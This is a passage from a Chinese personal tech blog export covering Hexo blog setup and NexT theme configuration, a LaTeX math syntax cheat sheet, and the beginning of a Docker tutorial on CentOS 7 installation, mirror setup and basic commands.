<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">cnpm -v </span><br></pre></td></tr></table></figure>

<p>输出版本号则安装成功</p>
<p><strong>Hexo</strong><br>在git bash执行下面的命令安装hexo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cnpm install hexo-cli -g </span><br></pre></td></tr></table></figure>

<p>新建一个文件夹，作为今后博文的本地存储文件夹，在此文件夹中右键打开git bash，执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>

<p>若在<code>install dependencies</code>卡住，按<code>ctrl + c</code>结束命令，执行以下命令使用国内镜像完成初始化</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cnpm install </span><br></pre></td></tr></table></figure>

<p>等命令执行完成后，执行以下命令即可预览博客：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>点击弹出的以httpk开头的网址，在浏览器中打开即可见到当前的预览。</p>
<h2 id="hexo使用"><a href="#hexo使用" class="headerlink" title="hexo使用"></a>hexo使用</h2><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><table>
<thead>
<tr>
<th>功能</th>
<th>命令格式</th>
<th>简写</th>
<th>补充</th>
</tr>
</thead>
<tbody><tr>
<td>创建新文章</td>
<td><code>hexo new &quot;My nes post&quot;</code></td>
<td><code>hexo n</code></td>
<td>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></td>
</tr>
<tr>
<td>创建草稿</td>
<td><code>hexo new draft &quot;my draft&quot;</code></td>
<td></td>
<td></td>
</tr>
<tr>
<td>发表草稿</td>
<td><code>hexo publis /[layout] &quot;my draft&quot;</code></td>
<td></td>
<td></td>
</tr>
<tr>
<td>清除本地静态文件</td>
<td><code>hexo clean</code></td>
<td></td>
<td>删除**public&#x2F;**和 cache 文件夹</td>
</tr>
<tr>
<td>按格式列出文件列表</td>
<td><code>hexo list &lt;type&gt;</code></td>
<td></td>
<td>Available types: page, post, route, tag, category</td>
</tr>
<tr>
<td>启动服务器（本地预览）</td>
<td><code>hexo server</code></td>
<td><code>hexo s</code></td>
<td>More info: <a href="https://hexo.io/docs/server.html">Server</a></td>
</tr>
<tr>
<td>生成静态文件</td>
<td><code>hexo generate</code></td>
<td><code>hexo g</code></td>
<td>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></td>
</tr>
<tr>
<td>部署到远程仓库</td>
<td><code>hexo deploy</code></td>
<td><code>hexo d</code></td>
<td>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></td>
</tr>
</tbody></table>
<h4 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h4><ol>
<li>删除本地文章</li>
<li>删除.deploy_git文件</li>
<li>执行命令：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>

<h3 id="文章参数"><a href="#文章参数" class="headerlink" title="文章参数"></a>文章参数</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span>  <span class="string">&quot;My First Post&quot;</span>                         <span class="comment"># 标题</span></span><br><span class="line"><span class="attr">date:</span>   <span class="number">2025-07-27 10:30:00</span>						<span class="comment"># 创建时间</span></span><br><span class="line"><span class="attr">updated:</span> <span class="number">2025-07-27 11:00:00</span>				 	<span class="comment"># 修改时间</span></span><br><span class="line"><span class="attr">tags:</span> [<span class="string">hexo</span>, <span class="string">guide</span>]								<span class="comment"># 标签</span></span><br><span class="line"><span class="attr">categories:</span> [<span class="string">blogging</span>]							<span class="comment"># 目录</span></span><br><span class="line"><span class="attr">description/abstract:</span> <span class="string">&quot;A quick intro to Hexo&quot;</span>	<span class="comment"># 简介，不同主题使用不同单词</span></span><br><span class="line"><span class="attr">cover:</span> <span class="string">/images/cover.jpg</span>						<span class="comment"># 封面，部分主题支持</span></span><br><span class="line"><span class="attr">comments:</span> <span class="literal">true</span>        							<span class="comment"># 评论，部分主题支持，需要额外配置</span></span><br><span class="line"><span class="attr">draft:</span> <span class="literal">false</span>          							<span class="comment"># 设置草稿，部分主题支持</span></span><br><span class="line"><span class="attr">password:</span> <span class="string">aaaa</span>									<span class="comment"># 密码，部分主题支持，需要额外配置</span></span><br><span class="line"><span class="attr">message:</span> <span class="string">请输入密码查看~</span>						   <span class="comment"># 密码提示信息，部分主题支持，同密码一样额外配置</span></span><br></pre></td></tr></table></figure>



<p>安装插件：</p>
<p>在文章开头添加：<br>password: 密码<br>message: 请输入密码查看~</p>
<h2 id="图床设置"><a href="#图床设置" class="headerlink" title="图床设置"></a>图床设置</h2><p>pisco</p>
<h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><p>以下为使用的next主题配置的相关信息：<br>favicon 网站图标<br>menu    左边菜单栏<br>删除powered by :<br>在<code>themes/next/layout/_partials/footer.swig</code>中删除相关语句<br>浏览页面显示当前浏览进度:<br>打开 <code>themes/next/_config.yml</code>，搜索关键字 <code>scrollpercent</code>，把 false 改为 true。<br>启用Local Search本地搜索:<br>执行以下命令安装插件:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>

<p>修改hexo&#x2F;_config.yml站点配置文件，新增以下内容到任意位置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">path: search.xml</span><br><span class="line">field: post</span><br><span class="line">format: html</span><br><span class="line">limit: 10000</span><br></pre></td></tr></table></figure>

<p>编辑主题配置文件，启用本地搜索功能local_search：</p>
<h2 id="博客个人设置"><a href="#博客个人设置" class="headerlink" title="博客个人设置"></a>博客个人设置</h2><p>在此博客中，采用了一套统一的命名习惯，以便更好地分类和管理内容。具体规则如下：</p>
<ul>
<li>**<code>Note</code>**：用于标记长篇操作笔记，通常涉及对编程语言、框架或其他大型开发技术的深入学习和记录。</li>
<li>**<code>Tip</code>**：用于记录小技巧或简短的技术窍门，方便快速查阅和应用。</li>
<li>**<code>Issue</code>**：专门用于整理开发过程中遇到的问题及其解决方案，帮助复盘和解决类似问题。</li>
<li>**<code>Project</code>**：简写作<code>P</code>，用于记录具体的项目开发过程，包括规划、实现细节和总结，适合回顾项目经验。</li>
<li>**<code>Thoughts</code>**：用于分享个人在开发过程中的思考、感悟或总结，涵盖技术哲学、最佳实践和个人成长。</li>
</ul>
<h2 id="LaTex数学公式语法速查表"><a href="#LaTex数学公式语法速查表" class="headerlink" title="LaTex数学公式语法速查表"></a>LaTex数学公式语法速查表</h2><h3 id="1-公式环境"><a href="#1-公式环境" class="headerlink" title="1. 公式环境"></a>1. 公式环境</h3><table>
<thead>
<tr>
<th>作用</th>
<th>语法示例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>行内公式</td>
<td><code>$ ... $</code></td>
<td>在文本中插入行内公式</td>
</tr>
<tr>
<td>行间公式</td>
<td><code>\[ ... \]</code> 或 <code>$$ ... $$</code></td>
<td>独立成行显示公式</td>
</tr>
<tr>
<td>公式编号</td>
<td><code>\begin&#123;equation&#125; ... \end&#123;equation&#125;</code></td>
<td>带编号的行间公式</td>
</tr>
</tbody></table>
<hr>
<h3 id="2-基本符号"><a href="#2-基本符号" class="headerlink" title="2. 基本符号"></a>2. 基本符号</h3><table>
<thead>
<tr>
<th>符号</th>
<th>代码</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>加减乘除</td>
<td><code>+</code> <code>-</code> <code>\times</code> <code>\div</code></td>
<td>$a + b$, $a \times b$</td>
<td>乘号 <code>\times</code>，除号<code>\div</code></td>
</tr>
<tr>
<td>等号</td>
<td><code>=</code></td>
<td>$a &#x3D; b$</td>
<td></td>
</tr>
<tr>
<td>不等号</td>
<td><code>\neq</code></td>
<td>$a \neq b$</td>
<td></td>
</tr>
<tr>
<td>小于等于</td>
<td><code>\leq</code></td>
<td>$a \leq b$</td>
<td></td>
</tr>
<tr>
<td>大于等于</td>
<td><code>\geq</code></td>
<td>$a \geq b$</td>
<td></td>
</tr>
</tbody></table>
<hr>
<h3 id="3-上下标"><a href="#3-上下标" class="headerlink" title="3. 上下标"></a>3. 上下标</h3><table>
<thead>
<tr>
<th>作用</th>
<th>代码</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>下标</td>
<td><code>a_&#123;i&#125;</code></td>
<td>$a_i$</td>
</tr>
<tr>
<td>上标</td>
<td><code>a^&#123;2&#125;</code></td>
<td>$a^2$</td>
</tr>
<tr>
<td>上下标同时</td>
<td><code>a_i^&#123;2&#125;</code></td>
<td>$a_i^2$</td>
</tr>
</tbody></table>
<hr>
<h3 id="4-分数与开方"><a href="#4-分数与开方" class="headerlink" title="4. 分数与开方"></a>4. 分数与开方</h3><table>
<thead>
<tr>
<th>作用</th>
<th>代码</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>分数</td>
<td><code>\frac&#123;分子&#125;&#123;分母&#125;</code></td>
<td>$\frac{a+b}{c}$</td>
</tr>
<tr>
<td>平方根</td>
<td><code>\sqrt&#123;被开方数&#125;</code></td>
<td>$\sqrt{2}$</td>
</tr>
<tr>
<td>开 n 次方根</td>
<td><code>\sqrt[n]&#123;被开方数&#125;</code></td>
<td>$\sqrt[3]{8}$</td>
</tr>
</tbody></table>
<hr>
<h3 id="5-希腊字母"><a href="#5-希腊字母" class="headerlink" title="5. 希腊字母"></a>5. 希腊字母</h3><table>
<thead>
<tr>
<th>字母</th>
<th>代码</th>
<th>字母</th>
<th>代码</th>
</tr>
</thead>
<tbody><tr>
<td>α</td>
<td><code>\alpha</code></td>
<td>Α</td>
<td><code>\Alpha</code></td>
</tr>
<tr>
<td>β</td>
<td><code>\beta</code></td>
<td>Β</td>
<td><code>\Beta</code></td>
</tr>
<tr>
<td>γ</td>
<td><code>\gamma</code></td>
<td>Γ</td>
<td><code>\Gamma</code></td>
</tr>
<tr>
<td>δ</td>
<td><code>\delta</code></td>
<td>Δ</td>
<td><code>\Delta</code></td>
</tr>
<tr>
<td>$\omega$</td>
<td><code>\omega</code></td>
<td>$\Omega$</td>
<td><code>\Omega</code></td>
</tr>
<tr>
<td>…</td>
<td>…</td>
<td>…</td>
<td>…</td>
</tr>
</tbody></table>
<p>（常用小写希腊字母以 <code>\alpha</code> 等表示，大写以 <code>\Gamma</code> 等表示）</p>
<hr>
<h3 id="6-运算符和关系符号"><a href="#6-运算符和关系符号" class="headerlink" title="6. 运算符和关系符号"></a>6. 运算符和关系符号</h3><table>
<thead>
<tr>
<th>代码</th>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>\pm</code></td>
<td>±</td>
<td>正负号</td>
</tr>
<tr>
<td><code>\times</code></td>
<td>×</td>
<td>乘号</td>
</tr>
<tr>
<td><code>\div</code></td>
<td>÷</td>
<td>除号</td>
</tr>
<tr>
<td><code>\cdot</code></td>
<td>·</td>
<td>点乘</td>
</tr>
<tr>
<td><code>\infty</code></td>
<td>∞</td>
<td>无穷大</td>
</tr>
<tr>
<td><code>\partial</code></td>
<td>∂</td>
<td>偏导符号</td>
</tr>
<tr>
<td><code>\approx</code></td>
<td>≈</td>
<td>约等于</td>
</tr>
<tr>
<td><code>\equiv</code></td>
<td>≡</td>
<td>恒等于</td>
</tr>
<tr>
<td><code>\subset</code></td>
<td>⊂</td>
<td>真子集</td>
</tr>
<tr>
<td><code>\subseteq</code></td>
<td>⊆</td>
<td>子集</td>
</tr>
</tbody></table>
<hr>
<h3 id="7-函数与操作符"><a href="#7-函数与操作符" class="headerlink" title="7. 函数与操作符"></a>7. 函数与操作符</h3><table>
<thead>
<tr>
<th>代码</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>\sin</code></td>
<td>$\sin x$</td>
<td>正弦函数</td>
</tr>
<tr>
<td><code>\cos</code></td>
<td>$\cos x$</td>
<td>余弦函数</td>
</tr>
<tr>
<td><code>\tan</code></td>
<td>$\tan x$</td>
<td>正切函数</td>
</tr>
<tr>
<td><code>\log</code></td>
<td>$\log x$</td>
<td>对数函数</td>
</tr>
<tr>
<td><code>\ln</code></td>
<td>$\ln x$</td>
<td>自然对数</td>
</tr>
<tr>
<td><code>\lim</code></td>
<td>$\lim_{x \to 0} f(x)$</td>
<td>极限</td>
</tr>
<tr>
<td><code>\sum</code></td>
<td>$\sum_{i&#x3D;1}^n a_i$</td>
<td>求和</td>
</tr>
<tr>
<td><code>\prod</code></td>
<td>$\prod_{i&#x3D;1}^n a_i$</td>
<td>连乘</td>
</tr>
<tr>
<td><code>\int</code></td>
<td>$\int_a^b f(x) dx$</td>
<td>积分</td>
</tr>
</tbody></table>
<hr>
<h3 id="8-括号和定界符"><a href="#8-括号和定界符" class="headerlink" title="8. 括号和定界符"></a>8. 括号和定界符</h3><table>
<thead>
<tr>
<th>代码</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>普通括号</td>
<td><code>( )</code></td>
<td></td>
</tr>
<tr>
<td>花括号</td>
<td><code>\&#123; \&#125;</code></td>
<td>用于集合等</td>
</tr>
<tr>
<td>方括号</td>
<td><code>[ ]</code></td>
<td></td>
</tr>
<tr>
<td>绝对值</td>
<td>&#96;</td>
<td>x</td>
</tr>
<tr>
<td>可伸缩括号</td>
<td><code>\left( ... \right)</code></td>
<td>自动调整大小的括号</td>
</tr>
<tr>
<td>其他定界符</td>
<td><code>\langle \rangle</code></td>
<td>夹角括号</td>
</tr>
</tbody></table>
<hr>
<h3 id="9-矢量与矩阵"><a href="#9-矢量与矩阵" class="headerlink" title="9. 矢量与矩阵"></a>9. 矢量与矩阵</h3><table>
<thead>
<tr>
<th>代码</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>矢量符号</td>
<td><code>\vec&#123;v&#125;</code></td>
<td>$\vec{v}$</td>
</tr>
<tr>
<td>粗体符号</td>
<td><code>\mathbf&#123;v&#125;</code></td>
<td>$\mathbf{v}$</td>
</tr>
<tr>
<td>矩阵环境</td>
<td><code>\begin&#123;matrix&#125; ... \end&#123;matrix&#125;</code></td>
<td>普通矩阵</td>
</tr>
<tr>
<td>带括号矩阵</td>
<td><code>\begin&#123;pmatrix&#125; ... \end&#123;pmatrix&#125;</code></td>
<td>圆括号矩阵</td>
</tr>
<tr>
<td>方括号矩阵</td>
<td><code>\begin&#123;bmatrix&#125; ... \end&#123;bmatrix&#125;</code></td>
<td>方括号矩阵</td>
</tr>
<tr>
<td>大括号矩阵</td>
<td><code>\begin&#123;Bmatrix&#125; ... \end&#123;Bmatrix&#125;</code></td>
<td>大括号矩阵</td>
</tr>
</tbody></table>
<hr>
<h3 id="10-其他符号"><a href="#10-其他符号" class="headerlink" title="10. 其他符号"></a>10. 其他符号</h3><table>
<thead>
<tr>
<th>代码</th>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>\dots</code></td>
<td>…</td>
<td>省略号</td>
</tr>
<tr>
<td><code>\cdots</code></td>
<td>⋯</td>
<td>居中省略号</td>
</tr>
<tr>
<td><code>\ldots</code></td>
<td>…</td>
<td>低位省略号</td>
</tr>
<tr>
<td><code>\forall</code></td>
<td>∀</td>
<td>对所有</td>
</tr>
<tr>
<td><code>\exists</code></td>
<td>∃</td>
<td>存在</td>
</tr>
<tr>
<td><code>\because</code></td>
<td>∵</td>
<td>因为</td>
</tr>
<tr>
<td><code>\therefore</code></td>
<td>∴</td>
<td>所以</td>
</tr>
</tbody></table>
<hr>
<h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><p><a href="https://www.cnblogs.com/huanhao/p/hexobase.html">基础学习</a><br><a href="https://hexo.io/zh-cn/docs/">Hexo官方文档</a></p>
<p><a href="https://hexo.io/themes/">主题获取</a></p>
<p><a href="https://theme-next.js.org/docs/theme-settings/">主题配置文档</a></p>
<p><a href="https://theme-next.iissnan.com/">主题配置中文文档</a></p>
<p><a href="https://blog.csdn.net/as480133937/article/details/100138838">主题配置教程1</a></p>
<p><a href="https://blog.csdn.net/Fosu_Chenai/article/details/111155327?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171437600616800184134340%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171437600616800184134340&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-111155327-null-null.142%5Ev100%5Epc_search_result_base2&utm_term=Hexo-Next&spm=1018.2226.3001.4187">主题配置教程2</a></p>
<p><a href="https://hexo-next.readthedocs.io/">NexT主题详细文档</a></p>
<p><a href="https://cs-cshi.github.io/categories/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/">Next主题</a></p>
<p><a href="https://blog.csdn.net/as480133937/article/details/100138838">Next主题配置-十分详尽！</a></p>
]]></content>
      <categories>
        <category>随笔与解决方案</category>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>Container-Docker</title>
    <url>/2025/02/18/Container-Docker/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>【参考资料】</p>
<p><a href="https://www.yuque.com/leifengyang/sutong/au0lv3sv3eldsmn8#">Docker快速通关</a></p>
<p><a href="https://www.bilibili.com/video/BV1Zn4y1X7AZ?spm_id_from=333.788.videopod.episodes&vd_source=20530c92c1be8bd70e37346e3a5c037a&p=6">Docker视频教程</a></p>
<p><a href="https://docs.docker.com/build-cloud/">Docker官网文档</a></p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><strong>Docker</strong>是一种用于开发、部署和运行应用程序的开放源代码平台，它通过使用<strong>容器化技术</strong>使软件能够在任何环境中一致地运行。容器<strong>将代码及其所有依赖项打包在一起</strong>，确保应用从一个计算环境迁移到另一个计算环境时能够可靠运行。Docker的主要优点包括提高开发效率、简化配置过程、确保一致性以及提升资源利用率。</p>
<p>举例来说，假设你正在开发一个Web应用程序，该程序在你的本地开发环境中运行良好。然而，当你尝试将这个应用程序部署到生产服务器上时，可能会遇到各种问题，比如：</p>
<ul>
<li><strong>环境差异</strong>：生产服务器可能安装了不同版本的操作系统、数据库或其他关键软件，这可能导致应用程序无法正常运行。</li>
<li><strong>依赖管理</strong>：不同的项目可能需要不同版本的库或框架，而这些依赖关系之间可能存在冲突。</li>
<li><strong>团队协作问题</strong>：如果团队成员的工作环境不一致（操作系统、工具版本等），可能会导致“在我机器上能跑”的问题。</li>
</ul>
<p><strong>使用Docker的好处</strong>：</p>
<ol>
<li><strong>一致性</strong>：通过Docker，你可以为你的应用创建一个包含所有依赖项的镜像，这样无论是在开发、测试还是生产环境中，应用都能以相同的方式运行。</li>
<li><strong>轻量级虚拟化</strong>：与传统的虚拟机相比，Docker容器更加轻量，启动速度更快，并且更有效地利用系统资源。</li>
<li><strong>快速部署</strong>：Docker允许你快速搭建服务环境，极大地加快了应用的部署流程。</li>
<li><strong>易于扩展和维护</strong>：可以轻松地将应用部署到多个服务器上，或者根据需要调整规模，同时保持环境的一致性。</li>
</ol>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250307234409.png"></p>
<h4 id="容器化技术"><a href="#容器化技术" class="headerlink" title="容器化技术"></a>容器化技术</h4><p>特点：<code>轻量</code>、<code>快速</code>、<code>隔离</code>、<code>跨平台</code>、<code>高密度（部署）</code></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250307235107.png"></p>
<p>容器类似轻量级的虚拟机，共享同样的操作系统内核，但拥有自己的文件系统、CPU、内存和地址空间等，相互间隔离。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在CentOS 7上更换为阿里云的yum源，按照以下步骤进行：</p>
<ol>
<li><p><strong>备份原来的repo文件</strong>：<br>首先，需要备份原有的repo文件以防万一。可以通过下面的命令来创建一个备份目录，并将现有的repo文件移动到该目录中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/yum.repos.d/backup/</span><br><span class="line">sudo <span class="built_in">mv</span> /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup/</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>下载阿里云的repo文件</strong>：<br>接下来，需要从阿里云下载对应的repo文件。根据系统版本选择合适的repo文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure>
<p>如果还需要EPEL（Extra Packages for Enterprise Linux）仓库，也可以一并替换：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>清除缓存并生成新的缓存</strong>：<br>下载完成后，需要清理旧的缓存，并重新建立新的缓存。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum clean all</span><br><span class="line">sudo yum makecache</span><br></pre></td></tr></table></figure></li>
</ol>
<p>完成上述步骤后，就可以使用阿里云提供的镜像源来安装和更新软件包了。</p>
<h4 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h4><p>直接参考<a href="https://www.yuque.com/leifengyang/sutong/au0lv3sv3eldsmn8#">安装教程</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 移除旧版本docker</span></span><br><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置docker yum源。</span></span><br><span class="line">sudo yum install -y yum-utils</span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">--add-repo \</span><br><span class="line">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 最新 docker</span></span><br><span class="line">sudo yum install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动&amp; 开机启动docker； enable + start 二合一</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker --now</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置加速</span></span><br><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;https://docker-0.unsee.tech/&quot;</span>,</span><br><span class="line"> 		<span class="string">&quot;https://docker-cf.registry.cyou/&quot;</span>,</span><br><span class="line">	    <span class="string">&quot;https://docker.1panel.live/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;https://registry.cn-hangzhou.aliyuncs.com&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line"><span class="comment"># 执行上述命令后使用以下命令验证，有输出即可</span></span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p>由于相关法律法规原因，大部分Docker镜像加速源已经不可用，可以参考</p>
<p><a href="https://blog.csdn.net/u014390502/article/details/143472743">国内能用的Docker镜像源【2025最新持续更新】</a></p>
<table>
<thead>
<tr>
<th>特性</th>
<th>镜像（Image）</th>
<th>容器（Container）</th>
</tr>
</thead>
<tbody><tr>
<td>状态</td>
<td>只读模板</td>
<td>运行中的实例</td>
</tr>
<tr>
<td>目的</td>
<td>作为创建容器的基础</td>
<td>运行应用程序</td>
</tr>
<tr>
<td>生命周期</td>
<td>静态，不随容器变化</td>
<td>动态，具有明确的生命周期</td>
</tr>
<tr>
<td>文件系统</td>
<td>多层只读文件系统</td>
<td>在镜像基础上增加一层可写文件系统</td>
</tr>
</tbody></table>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><table>
<thead>
<tr>
<th>分类</th>
<th>命令示例</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>镜像管理</strong></td>
<td><code>docker pull &lt;image&gt;</code></td>
<td>从Docker Hub拉取一个镜像。</td>
</tr>
<tr>
<td></td>
<td><code>docker images</code></td>
<td>列出本地所有的镜像。</td>
</tr>
<tr>
<td></td>
<td><code>docker rmi &lt;image_id&gt;</code></td>
<td>删除指定ID的镜像。</td>
</tr>
<tr>
<td></td>
<td><code>docker build -t &lt;name&gt; .</code></td>
<td>使用当前目录下的Dockerfile构建镜像，并命名为<code>&lt;name&gt;</code>。</td>
</tr>
<tr>
<td><strong>容器管理</strong></td>
<td><code>docker run -d &lt;image&gt;</code></td>
<td>在后台运行一个容器实例。</td>
</tr>
<tr>
<td></td>
<td><code>docker ps</code></td>
<td>列出所有正在运行的容器。</td>
</tr>
<tr>
<td></td>
<td><code>docker ps -a</code></td>
<td>列出所有容器（包括停止的）。</td>
</tr>
<tr>
<td></td>
<td><code>docker stop &lt;container_id&gt;</code></td>
<td>停止指定ID的容器。</td>
</tr>
<tr>
<td></td>
<td><code>docker start &lt;container_id&gt;</code></td>
<td>启动已存在的容器。</td>
</tr>
<tr>
<td></td>
<td><code>docker restart &lt;container_id&gt;</code></td>
<td>重启已存在的容器。</td>
</tr>
<tr>
<td></td>
<td><code>docker rm &lt;container_id&gt;</code></td>
<td>删除指定ID的容器。</td>
</tr>
<tr>
<td></td>
<td><code>docker stats &lt;container_id&gt;</code></td>
<td>查看容器状态</td>
</tr>
<tr>
<td></td>
<td><code>docker exec &lt;container_id&gt;</code></td>
<td>进入容器</td>
</tr>
<tr>
<td><strong>日志查看</strong></td>
<td><code>docker logs &lt;container_id&gt;</code></td>
<td>查看指定容器的日志输出。</td>
</tr>
<tr>
<td><strong>网络管理</strong></td>
<td><code>docker network ls</code></td>
<td>列出所有的Docker网络。</td>
</tr>
<tr>
<td></td>
<td><code>docker network create &lt;network&gt;</code></td>
<td>创建一个新的Docker网络。</td>
</tr>
<tr>
<td></td>
<td><code>docker network connect &lt;network&gt; &lt;container&gt;</code></td>
<td>将容器连接到一个网络。</td>
</tr>
<tr>
<td><strong>卷管理</strong></td>
<td><code>docker volume ls</code></td>
<td>列出所有的数据卷。</td>
</tr>
<tr>
<td></td>
<td><code>docker volume create &lt;volume&gt;</code></td>
<td>创建一个新的数据卷。</td>
</tr>
<tr>
<td></td>
<td><code>docker volume rm &lt;volume&gt;</code></td>
<td>删除指定的数据卷。</td>
</tr>
</tbody></table>
<h3 id="命令详解"><a href="#命令详解" class="headerlink" title="命令详解"></a>命令详解</h3><p>可以通过 <code>docker &lt;command&gt; --help</code> 来获取每个命令的完整帮助信息和更多选项</p>
<h4 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h4><p><strong>基本语法</strong>：具体可以通过 <code>docker run --help</code> 查看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>IMAGE</strong>: 要运行的镜像名称或ID。</li>
<li><strong>COMMAND</strong>: 容器启动后要执行的命令（可选）。</li>
<li><strong>ARG</strong>: 传递给命令的参数（可选）。</li>
<li><strong>[OPTIONS]</strong>: 各种选项来控制容器的行为。</li>
</ul>
<p><strong>常用参数：</strong></p>
<ol>
<li><p>运行模式</p>
<ul>
<li><p><code>-d, --detach</code>: 在后台运行容器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d nginx</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>--rm</code>: 容器退出时自动删除容器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> nginx</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>端口映射</p>
<ul>
<li><p><code>-p, --publish list</code>: 将容器的端口映射到主机的端口。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -p 8080:80 nginx</span><br></pre></td></tr></table></figure>
<p>这个例子将容器的80端口映射到主机的8080端口。</p>
</li>
</ul>
</li>
<li><p>卷挂载</p>
<ul>
<li><p><code>-v, --volume list</code>: 将主机目录挂载到容器中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -v /host/path:/container/path nginx</span><br></pre></td></tr></table></figure>
<p>这个例子将主机的 <code>/host/path</code> 目录挂载到容器的 <code>/container/path</code> 目录。</p>
</li>
</ul>
</li>
<li><p>环境变量</p>
<ul>
<li><p><code>-e, --env list</code>: 设置环境变量。</p>
